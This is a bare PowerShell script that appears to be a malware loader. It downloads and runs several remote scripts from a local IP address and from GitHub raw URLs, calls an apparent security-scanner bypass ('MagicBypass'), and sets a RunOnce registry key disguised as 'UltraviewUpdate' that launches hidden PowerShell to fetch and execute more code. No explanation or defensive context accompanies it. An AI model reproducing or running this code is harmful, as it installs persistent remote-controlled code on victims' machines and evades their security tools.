IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.4:8000/a1.ps1'); IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.4:8000/a2.ps1'); IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.4:8000/a3.ps1'); MagicBypass;

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/ok/refs/heads/main/ippo.ps1'' | iex"' -Type String -Force

for ($i = 1; $i -le 6; $i++) {
   
    $url = "https://raw.githubusercontent.com/jia891/ok/refs/heads/main/dc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent
}
